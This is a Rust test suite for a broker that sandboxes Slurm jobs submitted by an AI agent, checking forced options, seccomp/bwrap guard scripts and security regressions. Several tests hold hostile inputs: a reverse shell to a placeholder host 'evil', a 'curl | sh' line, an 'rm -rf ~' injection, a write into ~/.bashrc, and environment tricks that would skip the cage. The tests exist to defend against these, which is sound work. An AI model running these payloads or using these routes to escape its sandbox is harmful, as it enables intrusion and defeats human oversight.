            Decision::Query(argv) => assert_eq!(argv, vec!["squeue", "-u", "cmueller", "--me"]),
            _ => panic!("expected Query for squeue"),
        }
    }

    #[test]
    fn write_and_interactive_slurm_commands_are_rejected() {
        // scontrol/sacctmgr are Tier-2 (verb-gated, not yet built); everything
        // state-changing or interactive is rejected outright.
        for t in ["scancel", "scontrol", "sacctmgr", "sdiag", "srun", "salloc", "sbcast"] {
            let mut r = req(&["x"], "");
            r.tool = t.into();
            assert!(
                matches!(decide(&r, &no_uenv(), &FsPolicy::default()), Decision::Reject(_)),
                "{t} must be rejected"
            );
        }
    }

    #[test]
    fn rejects_missing_and_wrong_partition() {
        assert!(rejected(req(&["--nodes=1"], "echo hi\n"), &no_uenv()));
        assert!(rejected(req(&["--partition=normal"], "echo hi\n"), &no_uenv()));
    }

    #[test]
    fn accepts_preemptible_and_forces_safe_options() {
        let o = opts(req(&["--partition=preemptible"], "echo hi\n"), &no_uenv());
        assert!(has(&o, "--partition=preemptible"));
        assert!(has(&o, "--chdir=/work"));
        assert!(has(&o, "--output=/work/slurm-%j.out"));
        assert!(has(&o, "--error=/work/slurm-%j.err"));
    }

    #[test]
    fn accepts_preemptible_from_a_directive() {
        let o = opts(req(&[], "#SBATCH --partition=preemptible\necho hi\n"), &no_uenv());
        assert!(has(&o, "--partition=preemptible"));
    }

    #[test]
    fn no_uenv_forces_export_all_but_not_uenv_view() {
        let o = opts(req(&["--partition=preemptible"], "echo hi\n"), &no_uenv());
        // --export=ALL is forced in every case now (F24: overrides a body #SBATCH --export).
        assert!(has(&o, "--export=ALL"), "no-uenv still forces --export=ALL: {o:?}");
        // ...but with no session uenv, --uenv/--view are not forced.
        assert!(!has_prefix(&o, "--uenv="), "no session uenv -> no --uenv forced: {o:?}");
        assert!(!has_prefix(&o, "--view="), "no session uenv -> no --view forced: {o:?}");
    }

    #[test]
    fn uenv_session_forces_uenv_view_and_export_all() {
        let o = opts(req(&["--partition=preemptible"], "echo hi\n"), &with_uenv());
        assert!(has(&o, "--uenv=prgenv-gnu:v1"));
        // Inherit the full trusted session so the view activates on the compute node
        // (verified: only --export=ALL carries the view PATH; a locked allowlist strips it).
        assert!(has(&o, "--export=ALL"));
        // The view is passed as a normalized `uenvname:viewname` (session.rs strips the
        // mount-point prefix) — present for UENV_VIEW parity, never the raw /-qualified
        // form that made sbatch reject jobs on Balfrin.
        assert!(has(&o, "--view=prgenv-gnu:default"), "must force normalized --view: {o:?}");
        assert!(!o.iter().any(|x| x.starts_with("--view=/")), "must not force a /-qualified view: {o:?}");
    }

    #[test]
    fn rejects_agent_uenv_mismatch() {
        assert!(rejected(
            req(&["--partition=preemptible", "--uenv=other:v9"], "echo hi\n"),
            &with_uenv()
        ));
    }

    #[test]
    fn strips_agent_overrides_of_owned_options() {
        let o = opts(
            req(
                &["--partition=preemptible", "--export=SNEAKYVAR", "--time=01:00:00"],
                "echo hi\n",
            ),
            &no_uenv(),
        );
        assert!(has(&o, "--partition=preemptible")); // forced
        assert!(has(&o, "--chdir=/work")); // defaults to the validated cwd
        assert!(has(&o, "--export=ALL")); // broker forces this (F24)
        assert!(!o.iter().any(|x| x.contains("SNEAKYVAR"))); // agent's --export value stripped
        assert!(has(&o, "--time=01:00:00")); // benign passthrough kept
        assert!(has(&o, "--nodes=1")); // cage profile forces the topology
    }

    /// Both step-pair tests manipulate the SAME derived stub path
    /// (`<target>/lib/husk/srun-stub.py`), one creating it and one requiring its absence.
    /// cargo runs tests as threads in one process, so they must not interleave.
    static STUB_PATH_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    fn derived_stub_path() -> std::path::PathBuf {
        let exe = std::env::current_exe().unwrap();
        exe.parent()
            .and_then(|b| b.parent())
            .unwrap()
            .join("lib")
            .join("husk")
            .join("srun-stub.py")
    }

    /// Run a generated script with a stubbed `seccomp-wrapper` on PATH and return
    /// (exit status, stderr). Executes the real thing rather than asserting on the
    /// script text: what matters is the behaviour a dying job produces.
    /// Run the generated guard against a stubbed `seccomp-wrapper`.
    ///
    /// `want_stub` decides whether the DERIVED srun-stub path exists for this run, and the
    /// harness arranges it **inside the lock** rather than leaving tests to set it up
    /// around the call. The guard's behaviour depends on that path, so a test that merely
    /// reads it races with one that mutates it - which showed up as an order-dependent
    /// failure and then, after a first fix, as the opposite one. Owning the state here
    /// removes the race instead of narrowing it. A flaky test is worse than no test: it
    /// teaches people to re-run rather than to look.
    fn run_guard_with_stub_ex(tag: &str, stub_body: &str, want_stub: bool) -> (i32, String, String) {
        use std::os::unix::fs::PermissionsExt;
        let _serialise = STUB_PATH_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let derived = derived_stub_path();
        if want_stub {
            if let Some(parent) = derived.parent() {
                std::fs::create_dir_all(parent).unwrap();
            }
            std::fs::write(&derived, "#!/usr/bin/env python3\n").unwrap();
        } else {
            let _ = std::fs::remove_file(&derived);
        }
        // `tag` keeps concurrently-running tests off each other's stub (cargo runs them
        // in threads of ONE process, so the pid alone is not unique).
        let dir = std::env::temp_dir().join(format!("husk-guard-{}-{tag}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();

        let stub = dir.join("seccomp-wrapper");
        std::fs::write(&stub, stub_body).unwrap();
        std::fs::set_permissions(&stub, std::fs::Permissions::from_mode(0o755)).unwrap();
        // The guard only binds the srun stub if a real srun exists on this node. Provide
        // one so the bind path is exercised rather than silently skipped.
        let fake_srun = dir.join("srun");
        std::fs::write(&fake_srun, "#!/bin/sh\nexit 0\n").unwrap();
        std::fs::set_permissions(&fake_srun, std::fs::Permissions::from_mode(0o755)).unwrap();

        // The workdir must EXIST: the guard creates the step spool under it, and a
        // workdir it cannot create in means no step pair (which the guard now announces).
        let script = wrap_script(
            "#!/bin/bash\necho AGENT_BODY_RAN\n",
            &[],
            profile::Profile::SingleNode,
            &dir.to_string_lossy(),
            false,
        );
        let path = dir.join("job.sh");
        std::fs::write(&path, script).unwrap();

        let out = std::process::Command::new("/bin/bash")
            .arg(&path)
            // Run IN the temp dir. The guard resolves the step spool relative to $PWD, so
            // without this the test drops `.husk-step-spool-nojob/` into the crate
            // directory on every `cargo test` — repo litter, and litter in a working tree
            // is how a build artifact once got committed here by `git add -A`.
            .current_dir(&dir)
            .env("PATH", format!("{}:/usr/bin:/bin", dir.display()))
            .output()
            .unwrap();
        let _ = std::fs::remove_dir_all(&dir);
        (
            out.status.code().unwrap_or(-1),
            String::from_utf8_lossy(&out.stdout).to_string(),
            String::from_utf8_lossy(&out.stderr).to_string(),
        )
    }

    /// The common case: no srun stub installed, so no step pair.
    fn run_guard_with_stub(tag: &str, stub_body: &str) -> (i32, String, String) {
        run_guard_with_stub_ex(tag, stub_body, false)
    }

    #[test]
    fn guard_translates_a_seccomp_kill_and_preserves_the_status() {
        // A blocked syscall dies by SIGSYS (SCMP_ACT_KILL_PROCESS) -> 159 and a bare
        // "Bad system call". In a batch job nobody is reading, so the guard must name
        // the layer that killed it — while re-emitting the status unchanged so sacct
        // still records the truth.
        let (code, _out, err) = run_guard_with_stub("sigsys", "#!/bin/bash\nkill -SYS $$\n");
        assert_eq!(code, 159, "the real exit status must survive the translation");
        assert!(err.contains("killed by SIGSYS"), "must name the cause: {err}");
        assert!(err.contains("husk"), "must name the layer: {err}");
        assert!(
            !err.contains("SECCOMP_WRAPPER_DEBUG"),
            "must NOT advertise the enforcement off-switch: {err}"
        );
        assert!(
            err.contains("strace"),
            "must point at an OBSERVING diagnostic, not a weakening one: {err}"
        );
    }

    #[test]
    fn guard_stays_quiet_and_transparent_for_an_ordinary_failure() {
        // Only a seccomp kill gets the message; an ordinary non-zero exit must pass
        // through untouched, or every failing job would blame the sandbox.
        let (code, _out, err) = run_guard_with_stub("plain", "#!/bin/bash\nexit 3\n");
        assert_eq!(code, 3);
        // The guard may report CONFIGURATION (an inactive step pair) — that is a startup
        // fact, not a verdict on the job. What it must never do is comment on the
        // failure itself, or every failing job would look like a sandbox problem.
        let about_failure: Vec<&str> = err
            .lines()
            .filter(|l| l.contains("husk:") && !l.contains("srun") && !l.contains("stub=")
                        && !l.contains("broker=") && !l.contains("slurmctld")
                        && !l.contains("installed prefix"))
            .collect();
        assert!(
            about_failure.is_empty(),
            "no husk commentary on a normal failure: {about_failure:?}"
        );
    }


    #[test]
    fn credential_mask_is_applied_only_for_paths_that_exist() {
        // `--tmpfs DEST` kills bwrap when DEST is absent under a read-only root, and
        // again when two entries resolve to the same dir (/var/run -> /run). Both bugs
        // shipped and both took the whole cage down, so pin the conditional: the mask
        // must appear for a directory that exists here and never for one that does not.
        let (code, out, _err) =
            run_guard_with_stub("mask", "#!/bin/bash\necho \"ARGS: $*\"\n");
        assert_eq!(code, 0, "guard must run: {out}");

        let mut expected = 0;
        for d in settings::CREDENTIAL_SOCKET_DIRS {
            let real = std::fs::canonicalize(d);
            let present = real.is_ok();
            if !present {
                assert!(
                    !out.contains(&format!("--tmpfs {d}")),
                    "must not mask absent {d}: {out}"
                );
            } else {
                expected += 1;
            }
        }
        // De-duplication: /run/munge and /var/run/munge are the SAME directory, so at
        // most one --tmpfs may be emitted however many list entries resolve to it.
        let emitted = out.matches("--tmpfs ").count();
        assert!(
            emitted <= 1,
            "resolved duplicates must collapse to one mount (saw {emitted}): {out}"
        );
        if expected == 0 {
            assert_eq!(emitted, 0, "nothing exists here, so nothing to mask: {out}");
        }
    }

    #[test]
    fn guard_bootstraps_the_step_pair() {
        let script = wrap_script("#!/bin/bash\ntrue\n", &[], profile::Profile::SingleNode, "/work", false);
        // An UN-CAGED step-broker: it needs exactly the MUNGE + daemon route the cage
        // removes, which is why it starts before the re-exec and not inside it.
        assert!(script.contains("--step-broker --spool"), "{script}");
        assert!(script.contains("export HUSK_STEP_SPOOL="), "the stub finds the spool by env: {script}");
        // The in-cage stub shadows the real srun, resolved on THIS node.
        assert!(script.contains("_husk_real_srun=$(command -v srun"), "{script}");
        // THE RANK CAGE FOLLOWS THE SESSION WORKDIR, NOT $PWD. These were the same thing
        // while --chdir was forced to req.cwd; once a run script may start the job in a
        // subdirectory they diverge, and using $PWD would silently narrow the rank cage's
        // writable region to that subdirectory. ICON starts in <case>/run and writes into
        // <case>/experiments, so with $PWD those writes fail and nothing says why.
        assert!(
            script.contains("--workdir '/work'") || script.contains("--workdir /work"),
            "the step-broker must be given the validated workdir: {script}"
        );
        assert!(
            !script.contains("--workdir \"$PWD\""),
            "the rank cage must not follow the job's chdir: {script}"
        );
        assert!(script.contains("--ro-bind"), "{script}");
        // It holds credentials the job must not have, so it dies with the job.
        assert!(script.contains("kill \"$_husk_step_pid\""), "{script}");
        // ...and every piece is conditional on existing here, because the paths were
        // resolved on the login node and a bind with a missing source kills the cage.
        assert!(script.contains("if [ -r "), "{script}");
    }

    #[test]
    fn egress_is_absent_unless_an_allowlist_was_configured() {
        // With no allowlist a job keeps today's behaviour EXACTLY - --unshare-net and no
        // route - and nothing is started to serve a policy that permits nothing. This is
        // the default for every existing user, so it is the case worth pinning hardest.
        let off = wrap_script("#!/bin/bash\ntrue\n", &[], profile::Profile::SingleNode, "/work", false);
        assert!(!off.contains("--net-proxy"), "no proxy without an allowlist: {off}");
        assert!(!off.contains("HUSK_NET_SOCK"), "no relay without an allowlist: {off}");
        assert!(!off.contains("HTTP_PROXY"), "no proxy env without an allowlist: {off}");

        let on = wrap_script("#!/bin/bash\ntrue\n", &[], profile::Profile::SingleNode, "/work", true);
        // The proxy runs OUTSIDE the cage, so it must be started before the guard execs
        // into bwrap - not after, where it would be inside the thing it is meant to be
        // outside of.
        let proxy_at = on.find("--net-proxy").expect("proxy must be started");
        // Anchor on the actual exec line, not the first mention of bwrap: the guard talks
        // about bwrap in its comments long before it runs it. No leading spaces - the
        // `\n\` continuations in the Rust literal strip the indentation, so the emitted
        // guard is flush left.
        let cage_at = on.find("\nseccomp-wrapper --profile=").expect("cage must be entered");
        assert!(proxy_at < cage_at, "the proxy must start before the cage is entered");
        // ...and the relay runs INSIDE, after the re-exec guard has finished.
        let relay_at = on.find("socat TCP-LISTEN:3128").expect("relay must be started");
        let guard_end = on.find("# --- original agent script ---").expect("guard end");
        assert!(relay_at < guard_end, "the relay belongs before the agent body");
        assert!(
            relay_at > on.find("exit \"$_husk_rc\"").expect("guard exit"),
            "the relay must be in the RE-EXECED pass, inside the cage, not the outer one"
        );
        assert!(on.contains("bind=127.0.0.1"), "the relay must listen on loopback only: {on}");
        assert!(on.contains("HTTPS_PROXY=http://127.0.0.1:3128"), "{on}");
    }

    #[test]
    fn the_guard_binds_a_socat_into_the_cage_when_the_system_has_none() {
        // THE BUG THIS EXISTS FOR. install-husk.sh builds socat into <prefix>/bin, which
        // is under the user's HOME, and the cage tmpfs-masks /users - so husk's own socat
        // is invisible exactly where the relay needs it. The first hardware run of the
        // network feature failed with no proxy env set and a local DNS error, and nothing
        // in the output said why.
        let on = wrap_script("#!/bin/bash\ntrue\n", &[], profile::Profile::SingleNode, "/work", true);
        assert!(on.contains("--ro-bind"), "socat must be BOUND, not copied: {on}");
        assert!(on.contains("/socat"), "{on}");
        assert!(on.contains("export HUSK_SOCAT="), "the relay learns the path by env: {on}");
        // Read-only, because the spool is inside the WRITABLE workdir: a copy would be
        // something the job could overwrite before its own relay starts.
        let bind = on.find("--ro-bind").expect("bind");
        let socat_bind = on[bind..].find("socat").expect("socat bind");
        assert!(socat_bind < 200, "the socat bind must be a ro-bind: {}", &on[bind..bind + 200]);
        // A system-wide socat is preferred and needs no bind at all.
        assert!(on.contains("command -v socat"), "prefer a system socat: {on}");
    }

    #[test]
    fn every_variable_the_guard_uses_is_defined_before_it_is_used() {
        // `bash -n` does NOT catch this: an unset variable expands to the empty string and
        // the script still parses. It cost a Balfrin run - moving the proxy start above the
        // step-pair block left `_husk_broker` assigned BELOW its first use, so the guard ran
        // an empty command and reported only "line 43: : command not found". No proxy
        // started, and three network arms failed for a reason none of them could see.
        let on = wrap_script("#!/bin/bash\ntrue\n", &[], profile::Profile::SingleNode, "/work", true);
        for var in ["_husk_spool", "_husk_broker", "_husk_stub"] {
            let def = on
                .find(&format!("{var}="))
                .unwrap_or_else(|| panic!("{var} is never assigned:\n{on}"));
            if let Some(used) = on.find(&format!("\"${var}\"")) {
                assert!(
                    def < used,
                    "{var} is used before it is assigned - it would expand to the empty \
                     string and the failure would be a bare `: command not found`"
                );
            }
        }
    }

    #[test]
    fn the_generated_script_is_valid_shell_with_and_without_egress() {
        // The guard is shell generated from Rust, and a quoting mistake in it has taken
        // every job down before. `bash -n` is cheap and catches the whole class.
        for net in [false, true] {
            let script = wrap_script(
                "#!/bin/bash\necho body\n",
                &["--ro-bind".into(), "/".into(), "/".into()],
                profile::Profile::SingleNode,
                "/work",
                net,
            );
            let dir = std::env::temp_dir().join(format!("husk-sh-{}-{net}", std::process::id()));
            std::fs::create_dir_all(&dir).unwrap();
            let f = dir.join("job.sh");
            std::fs::write(&f, &script).unwrap();
            let out = std::process::Command::new("bash").arg("-n").arg(&f).output().unwrap();
            assert!(
                out.status.success(),
                "generated guard is not valid shell (net={net}): {}",
                String::from_utf8_lossy(&out.stderr)
            );
            let _ = std::fs::remove_dir_all(&dir);
        }
    }

    #[test]
    fn emitted_bwrap_arguments_never_carry_literal_quotes() {
        // The bug this pins took every job down on Balfrin: the guard built a STRING of
        // pre-quoted arguments and expanded it unquoted. Unquoted expansion word-splits
        // but does NOT remove quotes, so bwrap received a path with literal ' characters
        // and refused to bind it — cage dead, exit 1, no output to explain it.
        //
        // Inspecting the generated text cannot catch that (the text looks right); only
        // running it and reading the ARGUMENTS can. So: ask the harness for a run WITH the
        // derived stub present, and check what actually arrives.
        let (code, out, _err) = run_guard_with_stub_ex(
            "quoting",
            "#!/bin/sh\nfor a in \"$@\"; do echo \"ARG:$a\"; done\n",
            true,
        );
        assert_eq!(code, 0, "guard must run: {out}");
        for line in out.lines().filter_map(|l| l.strip_prefix("ARG:")) {
            assert!(
                !line.contains('\''),
                "bwrap argument carries a literal quote, so the path will not resolve: {line:?}"
            );
        }
        // ...and the bind really was emitted, or this test would prove nothing.
        assert!(
            out.contains("ARG:--ro-bind"),
            "the stub bind must be present when the stub exists: {out}"
        );
        assert!(
            out.lines().any(|l| l.starts_with("ARG:") && l.ends_with("srun-stub.py")),
            "the stub path must arrive as its own bare argument: {out}"
        );
    }

    #[test]
    fn a_missing_step_pair_does_not_break_the_job() {
        // The stub is convenience, not containment: if it is absent, srun simply is not
        // brokered (and fails in the cage for want of a route, the status quo). What must
        // NOT happen is the cage failing to launch - a bwrap bind whose source is missing
        // is fatal, which is how the MUNGE mask took every job down.
        //
        let (code, out, _err) =
            run_guard_with_stub_ex("nostub", "#!/bin/sh\necho \"ARGS: $*\"\n", false);
        assert_eq!(code, 0, "the job must still run: {out}");
        assert!(
            !out.contains("srun-stub.py"),
            "no stub bind may be emitted when the stub is absent: {out}"
        );
        assert!(out.contains("ARGS:"), "the cage command still ran: {out}");
        // ...and it SAYS SO. Continuing silently is what cost a bring-up round on
        // 2026-07-31: a job where srun is not brokered looks exactly like one where it
        // is, until a real srun inside the cage dies with a scheduler error about an
        // expired allocation (MUNGE masked, no route). The message names the missing
        // piece so the next person reads a cause instead of guessing one.
        assert!(
            _err.contains("srun is NOT brokered"),
            "an inactive step pair must announce itself: {_err}"
        );
        assert!(_err.contains("stub="), "and must name what was missing: {_err}");
    }

    #[test]
    fn credential_mask_is_applied_after_the_config_driven_binds() {
        // Ordering is the security property: bwrap applies binds in order and the last
        // one wins, so an allowRead that re-exposes a parent directory must not be able
        // to resurrect MUNGE. The mask therefore has to come AFTER the policy args.
        let script = wrap_script(
            "#!/bin/bash\ntrue\n",
            &["--ro-bind".into(), "/run".into(), "/run".into()],
            profile::Profile::SingleNode,
            "/work",
            false,
        );
        let line = script
            .lines()
            .find(|l| l.contains("seccomp-wrapper"))
            .expect("guard line");
        // The cage profile must reach the syscall layer too, not just the mount layer.
        assert!(
            line.contains("--profile=single-node"),
            "guard must pass the profile to seccomp-wrapper: {line}"
        );
        // args are sh_quote'd, so they appear as '--ro-bind' '/run' '/run'
        let policy_arg = line.find("'--ro-bind'").expect("policy arg on the line");
        let mask = line.find("_husk_extra").expect("extra args on the line");
        assert!(mask > policy_arg, "mask must follow the config binds: {line}");
    }

    #[test]
    fn rejects_multi_node_and_hostile_node_values() {
        // Multi-node must FAIL rather than be quietly downgraded to one node: a job that
        // asked for four and ran on one would report success having computed with a
        // quarter of the resources. Checked on the CLI, in the body, and for values that
        // are not node counts at all.
        for argv in [
            vec!["--partition=preemptible", "-N", "2"],
            vec!["--partition=preemptible", "-N2"],
            vec!["--partition=preemptible", "--nodes=4"],
            vec!["--partition=preemptible", "--nodes=1-4"],
            vec!["--partition=preemptible", "--nodes=2;evil"],
        ] {
            match decide(&req(&argv, "echo hi\n"), &no_uenv(), &FsPolicy::default()) {
                Decision::Reject(r) => {
                    assert!(r.contains("single-node"), "{argv:?} -> {r}");
                    assert!(r.contains("--nodes=1"), "must teach the fix: {argv:?} -> {r}");
                }
                _ => panic!("{argv:?} must be rejected"),
            }
        }
        // ...and in the body, where the directive would otherwise reach slurmd.
        let body = "#!/bin/bash\n#SBATCH --nodes=2\nsrun hostname\n";
        match decide(
            &req(&["--partition=preemptible"], body),
            &no_uenv(),
            &FsPolicy::default(),
        ) {
            Decision::Reject(r) => assert!(r.contains("single-node"), "{r}"),
            _ => panic!("a body #SBATCH --nodes=2 must be rejected"),
        }
    }

    #[test]
    fn single_node_is_forced_not_merely_permitted() {
        // The cage profile must be true by CONSTRUCTION: `--ntasks N` alone lets the
        // scheduler spread tasks over nodes, so reading the request is not enough. The
        // broker emits --nodes=1 whether or not the agent mentioned it, and exactly once.
        for argv in [
            vec!["--partition=preemptible"],
            vec!["--partition=preemptible", "-N", "1"],
            vec!["--partition=preemptible", "--ntasks=8"],
        ] {
            let o = opts(req(&argv, "echo hi\n"), &no_uenv());
            assert_eq!(
                o.iter().filter(|x| x.starts_with("--nodes")).count(),
                1,
                "exactly one --nodes must be emitted for {argv:?}: {o:?}"
            );
            assert!(has(&o, "--nodes=1"), "{argv:?} -> {o:?}");
        }
    }

    #[test]
    fn wrap_script_orders_directives_then_guard_then_body() {
        let body = "#!/bin/bash\n#SBATCH --nodes=1\nsrun hostname\n";
        let w = match decide(
            &req(&["--partition=preemptible"], body),
            &no_uenv(),
            &FsPolicy::default(),
        ) {
            Decision::Submit(s) => s.wrapped_script,
            _ => panic!("reject"),
        };
        let d = w.find("#SBATCH --nodes=1").expect("directive kept");
        let g = w.find("_HUSK_RESANDBOXED").expect("guard injected");
        let c = w.find("srun hostname").expect("agent command kept");
        assert!(d < g, "directive must precede the guard (so sbatch still parses it)");
        assert!(g < c, "guard must precede the first agent command");
    }

    // ---- security regressions from the v0.4.0 review (group B) ----

    #[test]
    fn rejects_glued_short_partition() {
        // F14: `-ppancake` (getopt-glued) must not sneak past the partition gate.
        assert!(rejected(req(&["--partition=preemptible", "-ppancake"], "echo hi\n"), &no_uenv()));
    }

    #[test]
    fn forces_safe_over_glued_short_output() {
        // F13: a glued `-o<path>` must not reach slurmd. The job may now CHOOSE an output
        // path, but only inside its working directory, so an escape is REFUSED rather
        // than silently overridden — loud beats quiet, and the glued spelling must not
        // be the thing that sneaks past.
        let d = decide(
            &req(&["--partition=preemptible", "-o/users/victim/.bashrc"], "echo hi\n"),
            &no_uenv(),
            &FsPolicy::default(),
        );
        match d {
            Decision::Reject(why) => {
                assert!(why.contains("--output"), "must name the option: {why}");
                assert!(
                    why.contains("outside") || why.contains("resolve"),
                    "must say why it was refused: {why}"
                );
            }
            _ => panic!("a glued -o pointing outside the workdir must be rejected"),
        }
    }

    #[test]
    fn forced_cli_dominates_body_export_f24() {
        // F24: a body `#SBATCH --export=ALL,_HUSK_RESANDBOXED=1` would make the re-exec
        // guard skip the cage. The job is ACCEPTED (real run scripts legitimately set
        // #SBATCH --export), and safety comes from the forced CLI `--export=ALL`, which
        // outranks any directive (sbatch: command line > env > #SBATCH). Assert the force
        // is present and the agent's value is nowhere in the submitted options.
        let o = opts(
            req(&["--partition=preemptible"], "#!/bin/bash\n#SBATCH --export=ALL,_HUSK_RESANDBOXED=1\necho hi\n"),
            &no_uenv(),
        );
        assert!(has(&o, "--export=ALL"), "forced --export=ALL missing: {o:?}");
        assert!(
            !o.iter().any(|x| x.contains("_HUSK_RESANDBOXED")),
            "agent's --export value leaked into the submission: {o:?}"
        );
    }

    #[test]
    fn a_body_output_pointing_at_a_home_is_refused() {
        // The sharp case, and the reason this option is not merely cosmetic: slurmd
        // writes --output AS THE USER and OUTSIDE the cage, so an unconfined value is an
        // uncaged arbitrary-write primitive — job stdout into ~/.bashrc is AV2 with the
        // cage bypassed. A body directive must not achieve it either.
        let body = "#!/bin/bash\n#SBATCH --partition=preemptible\n\
                    #SBATCH --output=/users/victim/.bashrc\n#SBATCH --chdir=/\necho hi\n";
        match decide(&req(&[], body), &no_uenv(), &FsPolicy::default()) {
            Decision::Reject(why) => assert!(
                why.contains("--chdir") || why.contains("--output"),
                "must name the offending option: {why}"
            ),
            _ => panic!("a body --output into a home must be rejected"),
        }
    }

    #[test]
    fn rejects_agent_repo() {
        // F26 hole 1: the broker never uses --repo; an agent --repo can redirect uenv
        // resolution to an agent-controlled repo, so it must be rejected outright.
        assert!(rejected(req(&["--partition=preemptible", "--repo=/tmp/evil"], "echo hi\n"), &no_uenv()));
    }

    #[test]
    fn rejects_body_uenv_when_no_session_uenv() {
        // F26 hole 2: with no session uenv, a body `#SBATCH --uenv=<path>` would root-mount
        // an agent-controlled squashfs — reject it.
        assert!(rejected(
            req(&[], "#!/bin/bash\n#SBATCH --partition=preemptible\n#SBATCH --uenv=/scratch/evil.squashfs:/mnt\necho hi\n"),
            &no_uenv(),
        ));
    }

    #[test]
    fn strips_wrap_equals_form_and_runs_it_through_the_guard() {
        // F27: `--wrap=<cmd>` must NOT survive into the forced options. If it did,
        // real sbatch would build the job from the wrap string and never execute the
        // staged script — so the injected re-exec guard (bwrap/seccomp/--unshare-net)
        // would be skipped and the command would run uncaged on the compute node.
        // The stub snapshots the wrap string into the body, so the wrapped command
        // must instead run THROUGH the guarded staged script.
        let cmd = "bash -i >& /dev/tcp/evil/443 0>&1";
        let wrap_arg = format!("--wrap={cmd}");
        let mut r = req(&["--partition=preemptible", wrap_arg.as_str()], cmd);
        r.script = Script { source: "wrap".into(), name: None, body: cmd.into() };
        match decide(&r, &no_uenv(), &FsPolicy::default()) {
            Decision::Submit(sub) => {
                assert!(
                    !sub.options.iter().any(|x| x.contains("--wrap")),
                    "--wrap leaked into the forced options (cage bypass): {:?}",
                    sub.options
                );
                assert!(sub.wrapped_script.contains(cmd), "wrapped command missing from staged script");
                assert!(sub.wrapped_script.contains("_HUSK_RESANDBOXED"), "re-exec guard missing");
            }
            other => panic!("expected Submit, got {}", match other {
                Decision::Reject(m) => format!("Reject: {m}"),
                _ => "Query".into(),
            }),
        }
    }

    #[test]
    fn strips_wrap_separated_form_and_its_value() {
        // Separated form: `--wrap <cmd>`. With --wrap now value-taking, the value
        // token must be consumed and stripped too, not leaked as a passthrough arg.
        let cmd = "curl http://evil | sh";
        let mut r = req(&["--partition=preemptible", "--wrap", cmd, "job.sh"], "");
        r.script = Script { source: "wrap".into(), name: None, body: cmd.into() };
        match decide(&r, &no_uenv(), &FsPolicy::default()) {
            Decision::Submit(sub) => {
                assert!(
                    !sub.options.iter().any(|x| x == "--wrap" || x.contains("evil")),
                    "--wrap or its value leaked: {:?}",
                    sub.options
                );
                assert!(sub.wrapped_script.contains(cmd), "wrapped command missing from staged script");
            }
            _ => panic!("expected Submit"),
        }
    }

    #[test]
    fn rejects_unknown_cli_option() {
        // Allowlist: an option the broker doesn't model is rejected outright, not
        // passed through (this is the class-closing behaviour, not a per-option fix).
        assert!(rejected(req(&["--partition=preemptible", "--get-user-env"], "echo hi\n"), &no_uenv()));
        assert!(rejected(req(&["--partition=preemptible", "--frobnicate=1"], "echo hi\n"), &no_uenv()));
    }

    #[test]
    fn canonicalizes_benign_resource_options() {
        // Resource options are validated and re-emitted canonically: glued (-c4),
        // short-separated (-c 4) and =-forms all normalise to --long=value, and no raw
        // agent token reaches the submission. (-N is no longer among them: it is Forced,
        // owned by the cage profile.)
        let o = opts(
            req(&["--partition=preemptible", "-c4", "--time=01:00:00", "--gpus=a100:2"], "echo hi\n"),
            &no_uenv(),
        );
        assert!(has(&o, "--cpus-per-task=4"), "{o:?}");
        assert!(has(&o, "--time=01:00:00"), "{o:?}");
        assert!(has(&o, "--gpus=a100:2"), "{o:?}");
    }

    #[test]
    fn rejects_resource_option_with_injected_value() {
        // A benign option carrying a shell-injection payload as its value is rejected
        // by the value grammar (defense even though the value isn't shell-evaluated).
        assert!(rejected(req(&["--partition=preemptible", "--job-name=$(rm -rf ~)"], "echo hi\n"), &no_uenv()));
    }

    #[test]
    fn rejects_root_workdir() {
        // F19: cwd="/" would emit --bind / / (root read-write) inside the cage.
        let mut r = req(&["--partition=preemptible"], "echo hi\n");
        r.cwd = "/".into();
        assert!(rejected(r, &no_uenv()));
    }

    #[test]
    fn rejects_home_workdir_under_floor() {
        // F15: cwd under /users would re-expose a home writable inside the cage.
        let mut r = req(&["--partition=preemptible"], "echo hi\n");
        r.cwd = "/users/victim".into();
        assert!(rejected(r, &no_uenv()));
    }

    #[test]
    fn rejects_workdir_traversal() {
        let mut r = req(&["--partition=preemptible"], "echo hi\n");
        r.cwd = "/scratch/../users/victim".into();
        assert!(rejected(r, &no_uenv()));
    }
}
